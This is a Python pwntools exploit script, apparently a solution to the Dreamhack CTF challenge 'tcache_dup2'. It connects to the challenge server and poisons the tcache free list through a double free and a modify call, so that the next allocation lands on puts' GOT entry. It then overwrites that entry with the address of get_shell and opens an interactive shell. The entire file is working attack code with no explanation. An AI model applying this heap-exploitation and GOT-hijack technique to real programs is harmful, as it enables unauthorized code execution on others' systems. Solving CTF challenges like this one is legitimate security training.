from pwn import *

p = remote("host3.dreamhack.games", 9258)
e = ELF("./tcache_dup2")
libc = ELF("./libc-2.30.so")

#context.log_level = 'debug'

get_shell = e.symbols['get_shell']
puts_got = e.got['puts']

def slog(symbol, addr): return success(symbol + ": " + hex(addr))

def create(size, data):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)

def modify(idx, size, data):
    p.sendlineafter("> ", "2")
    p.sendlineafter("idx: ", str(idx))
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("Data: ", data)

def delete(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter("idx: ", str(idx))


create(0x10, 'A'*8)
create(0x10, 'A'*8)

delete(0)
delete(1)

modify(1, 0x10, p64(puts_got))
create(0x10, 'B'*8)
create(0x10, p64(get_shell))

p.interactive()

